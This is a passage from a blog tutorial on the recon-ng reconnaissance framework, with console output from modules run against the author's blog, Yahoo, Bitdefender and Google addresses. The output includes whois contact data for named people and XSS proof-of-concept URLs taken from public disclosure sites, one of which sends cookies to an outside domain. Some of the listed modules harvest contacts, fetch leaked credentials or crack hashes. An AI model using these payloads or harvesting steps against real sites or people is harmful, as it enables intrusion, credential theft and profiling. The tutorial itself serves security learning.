</span><span class='line'>  --------  -------------  --------  -----------
</span><span class='line'>  DOWNLOAD  True           yes       download discovered files
</span><span class='line'>  PORT      80             yes       request port
</span><span class='line'>  PROTOCOL  http           yes       request protocol
</span><span class='line'>  SOURCE    default        yes       source of input (see 'show info' for details)
</span><span class='line'>
</span><span class='line'>Source Options:
</span><span class='line'>  default        SELECT DISTINCT host FROM hosts WHERE host IS NOT NULL ORDER BY host
</span><span class='line'>  &lt;string&gt;       string representing a single input
</span><span class='line'>  &lt;path&gt;         path to a file containing a list of inputs
</span><span class='line'>  query &lt;sql&gt;    database query returning one column of inputs
</span><span class='line'>
</span><span class='line'>Comments:
</span><span class='line'>  * Files: robots.txt, sitemap.xml, sitemap.xml.gz, crossdomain.xml, phpinfo.php, test.php, elmah.axd,
</span><span class='line'>  server-status, jmx-console/, admin-console/, web-console/
</span><span class='line'>  * Google Dorks:
</span><span class='line'>    - inurl:robots.txt ext:txt
</span><span class='line'>    - inurl:elmah.axd ext:axd intitle:"Error log for"
</span><span class='line'>    - inurl:server-status "Apache Status"</span></code></pre></td></tr></table></div></figure>


<p>I found this a bit confusing at first, but the SOURCE is the equivalent of the target you do recon on. I ran this on my own blog for a demo. When setting a target, keep in mind not to include the http or https (the protocol setting handles that), and also to exclude the trailing slash (I got errors until I did that).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][interesting_files] &gt; run
</span><span class='line'>[*] http://chousensha.github.io:80/robots.txt =&gt; 200. 'robots.txt' found!
</span><span class='line'>[*] http://chousensha.github.io:80/sitemap.xml =&gt; 200. 'sitemap.xml' found!
</span><span class='line'>[*] http://chousensha.github.io:80/sitemap.xml.gz =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/crossdomain.xml =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/phpinfo.php =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/test.php =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/elmah.axd =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/server-status =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/jmx-console/ =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/admin-console/ =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/web-console/ =&gt; 404
</span><span class='line'>[*] 2 interesting files found.
</span><span class='line'>[*] ...downloaded to '/root/.recon-ng/workspaces/default/'</span></code></pre></td></tr></table></div></figure>


<p>You can see recon-ng found 2 interesting files and it downloaded them to my machine</p>

<h2>Exploitation</h2>

<ul>
<li><p>Remote Command Injection Shell Interface &ndash; Provides a shell interface for remote command injection flaws in web applications</p></li>
<li><p>Xpath Injection Brute Forcer &ndash; Exploits XPath injection flaws to enumerate the contents of serverside XML documents</p></li>
</ul>


<h2>Import</h2>

<ul>
<li><p>Advanced CSV File Importer &ndash; Imports values from a CSV file into a database table.</p></li>
<li><p>List File Importer &ndash; Imports values from a list file into a database table and column</p></li>
</ul>


<h2>Recon</h2>

<ul>
<li><p>Facebook Contact Enumerator &ndash; Harvests contacts from Facebook.com. Updates the &lsquo;contacts&rsquo; table with the results</p></li>
<li><p>Jigsaw &ndash; Point Usage Statistics Fetcher &ndash; Queries the Jigsaw API for the point usage statistics of the given account.</p></li>
<li><p>Jigsaw &ndash; Single Contact Retriever &ndash; Retrieves a single complete contact from the Jigsaw.com API using points from the given account</p></li>
<li><p>Jigsaw Contact Enumerator &ndash; Harvests contacts from the Jigsaw.com API. Updates the &lsquo;contacts&rsquo; table with the results</p></li>
<li><p>Jigsaw Authenticated Contact Enumerator &ndash; Harvests contacts from Data.com using an authenticated user account. Updates the &lsquo;contacts&rsquo; table
with the results. Use &lsquo;keys&rsquo; to set your jigsaw username and password before use.</p></li>
<li><p>LinkedIn Authenticated Contact Enumerator &ndash; Harvests contacts from the LinkedIn.com API using an authenticated connections network. Updates the
&lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Whois Data Miner &ndash; Uses the ARIN Whois RWS to harvest companies, locations, netblocks, and contacts associated with the
given company search string. Updates the respective tables with the results.</p></li>
</ul>


<p>Let&rsquo;s see this in action against Yahoo:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][whois_miner] &gt; run
</span><span class='line'>[*] URL: http://whois.arin.net/rest/orgs;name=yahoo
</span><span class='line'>
</span><span class='line'>-----
</span><span class='line'>YAHOO
</span><span class='line'>-----
</span><span class='line'>[*] Location: 701 First Avenue, Sunnyvale, CA 94089
</span><span class='line'>[*] URL: http://whois.arin.net/rest/org/YAHOO-1/nets
</span><span class='line'>[*] Netblock: 8.3.34.0/23
</span><span class='line'>[*] Netblock: 216.34.77.0/25
</span><span class='line'>[*] Netblock: 8.8.178.0/24
</span><span class='line'>[*] Netblock: 64.209.232.0/24
</span><span class='line'>[*] Netblock: 64.39.38.208/28
</span><span class='line'>[*] Netblock: 204.71.177.0/24
</span><span class='line'>[*] Netblock: 204.71.188.0/24
</span><span class='line'>[*] Netblock: 216.136.220.128/25
</span><span class='line'>[*] Netblock: 64.56.197.208/28
</span><span class='line'>[*] Netblock: 67.72.118.0/23
</span><span class='line'>[*] URL: http://whois.arin.net/rest/org/YAHOO-1/pocs
</span><span class='line'>[*] Contact: Netblock Admin (netblockadmin@yahoo-inc.com) - Whois contact (Admin) (Sunnyvale, CA - United States)
</span><span class='line'>[*] Contact: Netblock Admin (netblockadmin@yahoo-inc.com) - Whois contact (Tech) (Sunnyvale, CA - United States)
</span><span class='line'>[*] Contact: Network Abuse (abuse@yahoo-inc.com) - Whois contact (Abuse) (Sunnyvale, CA - United States)
</span><span class='line'>
</span><span class='line'>-----
</span><span class='line'>YAHOO
</span><span class='line'>-----
</span><span class='line'>[*] Location: 325 Geri St, Lawrenceburg, TN 38464
</span><span class='line'>[*] URL: http://whois.arin.net/rest/org/YAHOO-10/nets
</span><span class='line'>[*] Netblock: 12.23.247.176/29
</span><span class='line'>[*] URL: http://whois.arin.net/rest/org/YAHOO-10/pocs
</span><span class='line'>[*] Contact: Janice Kilburn (jkilburn1stop@yahoo.com) - Whois contact (Admin) (Lawrenceburg, TN - United States)
</span><span class='line'>[*] Contact: Janice Kilburn (jkilburn1stop@yahoo.com) - Whois contact (Abuse) (Lawrenceburg, TN - United States)
</span><span class='line'>[*] Contact: Janice Kilburn (jkilburn1stop@yahoo.com) - Whois contact (Tech) (Lawrenceburg, TN - United States)
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customers;name=yahoo
</span><span class='line'>
</span><span class='line'>-----
</span><span class='line'>YAHOO
</span><span class='line'>-----
</span><span class='line'>[*] Location: 225 Broadway, San Diego, CA 92101
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C00146168/nets
</span><span class='line'>[*] Netblock: 209.132.98.0/29
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C00146168/pocs
</span><span class='line'>[*] No POCS found.
</span><span class='line'>
</span><span class='line'>-----
</span><span class='line'>YAHOO
</span><span class='line'>-----
</span><span class='line'>[*] Location: 225 Broadway, San Diego, CA 92101
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C00146169/nets
</span><span class='line'>[*] Netblock: 209.132.98.8/29
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C00146169/pocs
</span><span class='line'>[*] No POCS found.
</span><span class='line'>
</span><span class='line'>-----
</span><span class='line'>YAHOO
</span><span class='line'>-----
</span><span class='line'>[*] Location: 624 S Grand, Los Angeles, CA 90017
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C01196389/nets
</span><span class='line'>[*] Netblock: 65.91.7.80/29
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C01196389/pocs
</span><span class='line'>[*] No POCS found.
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 5 total (2 new) companies found.
</span><span class='line'>[*] 5 total (4 new) locations found.
</span><span class='line'>[*] 14 total (14 new) netblocks found.
</span><span class='line'>[*] 6 total (6 new) contacts found.</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>Bing Linkedin Profile Harvester &ndash; Harvests contacts from linkedin.com by querying Bing for Linkedin pages related to the given
companies, parsing the profiles, and adding them to the &lsquo;profiles&rsquo; table</p></li>
<li><p>MailTester Email Validator &ndash; Leverages MailTester.com to validate email addresses</p></li>
<li><p>Contact Name Mangler &ndash; Applies a mangle pattern to all of the contacts stored in the database, creating email addresses or
usernames for each harvested contact. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Contact Name Unmangler &ndash; Applies a regex or unmangle pattern to all of the contacts stored in the database, pulling out the
individual name components. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Have I been pwned? Breach Search &ndash; Leverages the haveibeenpwned.com API to determine if email addresses are associated with breached
credentials. Adds compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
<li><p>Have I been pwned? Paste Search &ndash; Leverages the haveibeenpwned.com API to determine if email addresses have been published to various
paste sites. Adds compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
<li><p>PwnedList Validator &ndash; Leverages PwnedList.com to determine if email addresses are associated with leaked credentials. Adds
compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
<li><p>Contacts to Domains Data Migrator &ndash; Adds a new domain for all the hostnames associated with email addresses stored in the &lsquo;contacts&rsquo;
table.</p></li>
<li><p>FullContact Contact Enumerator &ndash; Harvests contact information and profiles from the fullcontact.com API using email addresses as
input. Updates the &lsquo;contacts&rsquo; and &lsquo;profiles&rsquo; tables with the results.</p></li>
<li><p>Adobe Hash Cracker &ndash; Decrypts hashes leaked from the 2013 Adobe breach. First, the module cross references the leak ID to
identify Adobe hashes in the &lsquo;password&rsquo; column of the &lsquo;creds&rsquo; table, moves the Adobe hashes to the
&lsquo;hash&rsquo; column, and changes the &lsquo;type&rsquo; to &lsquo;Adobe&rsquo;. Second, the module attempts to crack the hashes
by comparing the ciphertext&rsquo;s decoded cipher blocks to a local block lookup table (BLOCK_DB) of
known cipher block values. Finally, the module updates the &lsquo;creds&rsquo; table with the results based on
the level of success.</p></li>
<li><p>PyBozoCrack Hash Lookup &ndash; Searches Google for the value of a hash and tests for a match by hashing every word in the resulting
page using all hashing algorithms supported by the &lsquo;hashlib&rsquo; library. Updates the &lsquo;credentials&rsquo;
table with the positive results.</p></li>
<li><p>Hashes.org Hash Lookup &ndash; Uses the Hashes.org API to perform a reverse hash lookup. Updates the &lsquo;credentials&rsquo; table with the
positive results.</p></li>
<li><p>leakdb Hash Lookup &ndash; Uses the leakdb hash database to perform a reverse hash lookup. Updates the &lsquo;credentials&rsquo; table with
the positive results.</p></li>
<li><p>PGP Key Owner Lookup &ndash; Searches the MIT public PGP key server for email addresses of the given domain. Updates the
&lsquo;contacts&rsquo; table with the results</p></li>
</ul>


<p>This module is similar to <a href="recon/domains-contacts/salesmaple">theHarvester</a></p>

<ul>
<li><p>SalesMaple Contact Harvester &ndash; Harvests contacts from the SalesMaple API using domains as input. Updates the &lsquo;contacts&rsquo; table with
the results.</p></li>
<li><p>Whois POC Harvester &ndash; Uses the ARIN Whois RWS to harvest POC data from whois queries for the given domain. Updates the
&lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>PwnedList &ndash; Account Credentials Fetcher &ndash; Queries the PwnedList API for credentials associated with the given usernames. Updates the
&lsquo;credentials&rsquo; table with the results.</p></li>
<li><p>PwnedList &ndash; API Usage Statistics Fetcher &ndash; Queries the PwnedList API for account usage statistics</p></li>
<li><p>PwnedList &ndash; Pwned Domain Credentials Fetcher &ndash; Queries the PwnedList API to fetch all credentials for a domain. Updates the &lsquo;credentials&rsquo; table
with the results</p></li>
<li><p>PwnedList &ndash; Pwned Domain Statistics Fetcher &ndash; Queries the PwnedList API for a domain to determine if any associated credentials have been
compromised. This module does NOT return any credentials, only a total number of compromised
credentials.</p></li>
<li><p>PwnedList &ndash; Leak Details Fetcher (leak_lookup.py) &ndash; Queries the local database for information associated with a leak ID. The &lsquo;leaks_dump&rsquo; module must
be used to populate the local database before this module will execute successfully.</p></li>
<li><p>PwnedList &ndash; Leak Details Fetcher (leaks_dump.py) &ndash; Queries the PwnedList API for information associated with all known leaks. Updates the &lsquo;leaks&rsquo; table with the results.</p></li>
<li><p>DNS Public Suffix Brute Forcer &ndash; Brute forces TLDs and SLDs using DNS. Updates the &lsquo;domains&rsquo; table with the results</p></li>
<li><p>Baidu Hostname Enumerator &ndash; Harvests hosts from Baidu.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
the results</p></li>
<li><p>Bing API Hostname Enumerator &ndash; Leverages the Bing API and &ldquo;domain:&rdquo; advanced search operator to harvest hosts. Updates the &lsquo;hosts&rsquo;
table with the results.</p></li>
<li><p>Bing Hostname Enumerator &ndash; Harvests hosts from Bing.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with the
results.</p></li>
<li><p>DNS Hostname Brute Forcer &ndash; Brute forces host names using DNS. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
<li><p>BuiltWith Enumerator &ndash; Leverages the BuiltWith API to identify hosts, technologies, and contacts associated with a domain</p></li>
<li><p>Google CSE Hostname Enumerator &ndash; Leverages the Google Custom Search Engine API to harvest hosts using the &lsquo;site&rsquo; search operator.
Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>Google Hostname Enumerator &ndash; Harvests hosts from Google.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
the results</p></li>
<li><p>Netcraft Hostname Enumerator &ndash; Harvests hosts from Netcraft.com. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
<li><p>Shodan Hostname Enumerator &ndash; Harvests hosts from the Shodan API by using the &lsquo;hostname&rsquo; search operator. Updates the &lsquo;hosts&rsquo;
table with the results.</p></li>
<li><p>SSL SAN Lookup &ndash; Uses the ssltools.com site to obtain the Subject Alternative Names for a domain. Updates the &lsquo;hosts&rsquo;
table with the results.</p></li>
<li><p>VPNHunter Lookup &ndash; Checks vpnhunter.com for SSL VPNs, remote accesses, email portals and generic login sites. Updates
the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>Yahoo Hostname Enumerator &ndash; Harvests hosts from Yahoo.com by using the &lsquo;domain&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
the results.</p></li>
<li><p>PunkSPIDER Vulnerabilty Finder &ndash; Leverages the PunkSPIDER API to search for previosuly discovered vulnerabltiies on hosts within a
domain.</p></li>
<li><p>XSSed Domain Lookup &ndash; Checks XSSed.com for XSS records associated with a domain and displays the first 20 results</p></li>
</ul>


<p>This is a very handy module for XSS lookup. Let&rsquo;s take a look at it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][xssed] &gt; run
</span><span class='line'>
</span><span class='line'>---------
</span><span class='line'>YAHOO.COM
</span><span class='line'>---------
</span><span class='line'>[*] Category: XSS
</span><span class='line'>[*] Example: http://adz.kr.yahoo.com/CRZY/2006/hyundaicard_0913_150365_1a.swf?clickTAG=javascript:alert%20(docume&lt;br&gt;nt.cookie);document.location%20=%20%22http://1337hax0rz.com%22
</span><span class='line'>[*] Host: adz.kr.yahoo.com
</span><span class='line'>[*] Publish_Date: 2015-03-10 00:00:00
</span><span class='line'>[*] Reference: http://xssed.com/mirror/60821/
</span><span class='line'>[*] Status: fixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: XSS
</span><span class='line'>[*] Example: http://us.yimg.vip.scd.yahoo.com/us.yimg.com/a/ya/yahoo_mail/ninja8b_nooffer.swf?clickTAG=javascript&lt;br&gt;:alert(/412/)
</span><span class='line'>[*] Host: us.yimg.vip.scd.yahoo.com
</span><span class='line'>[*] Publish_Date: 2012-02-16 00:00:00
</span><span class='line'>[*] Reference: http://xssed.com/mirror/57596/
</span><span class='line'>[*] Status: fixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: Script Insertion
</span><span class='line'>[*] Example: http://fr.groups.yahoo.com/search?query=%3Cscript%3Ealert(String.fromCharCode(88%2C83%2C83))%3C%2Fsc&lt;br&gt;ript%3E&sort=relevance
</span><span class='line'>[*] Host: fr.groups.yahoo.com
</span><span class='line'>[*] Publish_Date: 2011-12-22 00:00:00
</span><span class='line'>[*] Reference: http://xssed.com/mirror/61982/
</span><span class='line'>[*] Status: unfixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: XSS
</span><span class='line'>[*] Example: http://basketball.fantasysports.yahoo.com/nba/playerranker?lid=&lt;script&gt;alert(/XSS-by-[]0iZy5/)&lt;/scri&lt;br&gt;pt&gt;
</span><span class='line'>[*] Host: basketball.fantasysports.yahoo.com
</span><span class='line'>[*] Publish_Date: 2011-12-21 00:00:00
</span><span class='line'>[*] Reference: http://xssed.com/mirror/71051/
</span><span class='line'>[*] Status: unfixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: Redirect
</span><span class='line'>[*] Example: http://www.yahoo.com/SIG=15ohh3h62/M=722732.13975606.14062129.13194555/D=regst/S=150002347:R2/Y=YAHO&lt;br&gt;O/EXP=1275539597/L=hnNys0Kjqbp5Cok8Sr10cAJDTPYa3UwHFG0AANhn/B=VSDoPmKJiUs-/J=1275532397077354/K=rS6p&lt;br&gt;wy3MN2NPP7SBqBCOAQ/A=6097785/R=0/SIG=11o4aqdmv/*http://xssed.com/newsearch/searchpad.html
</span><span class='line'>[*] Host: www.yahoo.com
</span><span class='line'>[*] Publish_Date: 2011-12-21 00:00:00
</span><span class='line'>[*] Reference: http://xssed.com/mirror/67076/
</span><span class='line'>[*] Status: unfixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>XSSposed Domain Lookup &ndash; Checks XSSposed.com for XSS records associated with a domain</li>
</ul>


<p>Another good module for hunting down XSS</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][xssposed] &gt; run
</span><span class='line'>
</span><span class='line'>---------------
</span><span class='line'>BITDEFENDER.COM
</span><span class='line'>---------------
</span><span class='line'>[*] Category: REDIRECT
</span><span class='line'>[*] Example: https://safeweb.norton.com/report/show?url=store.bitdefender.com
</span><span class='line'>[*] Host: store.bitdefender.com
</span><span class='line'>[*] Publish_Date: 2016-06-20 21:09:16
</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/160213/
</span><span class='line'>[*] Status: unfixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: XSS
</span><span class='line'>[*] Example: https://labs.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert`OPENBUGBOUNTY`
</span><span class='line'>[*] Host: labs.bitdefender.com
</span><span class='line'>[*] Publish_Date: 2016-05-17 20:31:25
</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/154457/
</span><span class='line'>[*] Status: fixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: XSS
</span><span class='line'>[*] Example: https://rdprojects.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert`OPENBUGBOUNTY`
</span><span class='line'>[*] Host: rdprojects.bitdefender.com
</span><span class='line'>[*] Publish_Date: 2016-05-17 20:32:26
</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/154458/
</span><span class='line'>[*] Status: fixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: REDIRECT
</span><span class='line'>[*] Example: http://www.bitdefender.com/site/Main/tdRedirect/?url=http://xssposed.org/
</span><span class='line'>[*] Host: bitdefender.com
</span><span class='line'>[*] Publish_Date: 2016-01-03 01:53:37
</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/121291/
</span><span class='line'>[*] Status: fixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: REDIRECT
</span><span class='line'>[*] Example: https://store.bitdefender.com/redirect.php?url=http://xssposed.org/
</span><span class='line'>[*] Host: store.bitdefender.com
</span><span class='line'>[*] Publish_Date: 2015-09-19 20:33:58
</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/87399/
</span><span class='line'>[*] Status: fixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 5 total (5 new) vulnerabilities found.</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>Hosts to Domains Data Migrator &ndash; Adds a new domain for all the hostnames stored in the &lsquo;hosts&rsquo; table</p></li>
<li><p>Bing API IP Neighbor Enumerator &ndash; Leverages the Bing API and &ldquo;ip:&rdquo; advanced search operator to enumerate other virtual hosts sharing
the same IP address. Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>FreeGeoIP &ndash; Leverages the freegeoip.net API to geolocate a host by IP address. Updates the &lsquo;hosts&rsquo; table with
the results</p></li>
</ul>


<p>I used this to check the location of www.google.com host (resolved the IP first):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][freegeoip] &gt; run
</span><span class='line'>[*] 172.217.16.100 - 37.4192,-122.0574 - Mountain View, California, United States</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>My-IP-Neighbors.com Lookup &ndash; Checks My-IP-Neighbors.com for virtual hosts on the same server. Updates the &lsquo;hosts&rsquo; table with the
results.</p></li>
<li><p>IPInfoDB GeoIP &ndash; Leverages the ipinfodb.com API to geolocate a host by IP address. Updates the &lsquo;hosts&rsquo; table with the
results.</p></li>
<li><p>Hostname Resolver &ndash; Resolves the IP address for a host. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
<li><p>Reverse Resolver &ndash; Conducts a reverse lookup for each IP address to resolve the hostname. Updates the &lsquo;hosts&rsquo; table
with the results.</p></li>
<li><p>Address Geocoder &ndash; Queries the Google Maps API to obtain coordinates for an address. Updates the &lsquo;locations&rsquo; table with
the results.</p></li>
</ul>


<p>Let&rsquo;s see this module in action with one of our favorite tech giants&#8217; addresses xD (I leave it to you to see what&rsquo;s located there):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][geocode] &gt; run
</span><span class='line'>[*] Geocoding '1600 Amphitheatre Parkway'...
</span><span class='line'>[*] Latitude: 37.4224713, Longitude: -122.0843333
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 1 total (1 new) locations found.</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Reverse Geocoder &ndash; Queries the Google Maps API to obtain an address from coordinates.</li>
</ul>


<p>So we have some coordinates. Let&rsquo;s see what&rsquo;s there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][reverse_geocode] &gt; run
</span><span class='line'>[*] Reverse geocoding (35.670337, 139.702573)...
</span><span class='line'>[*] 1 Chome-18-20 Jingūmae, Shibuya-ku, Tōkyō-to 150-0001, Japan
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 1 total (1 new) locations found.</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>Flickr Geolocation Search &ndash; Searches Flickr for media in the specified proximity to a location.</p></li>
<li><p>Instagram Geolocation Search &ndash; Searches Instagram for media in the specified proximity to a location.</p></li>
<li><p>Picasa Geolocation Search &ndash; Searches Picasa for media in the specified proximity to a location.</p></li>
<li><p>Shodan Geolocation Search &ndash; Searches Shodan for media in the specified proximity to a location.</p></li>
<li><p>Twitter Geolocation Search &ndash; Searches Twitter for media in the specified proximity to a location.</p></li>
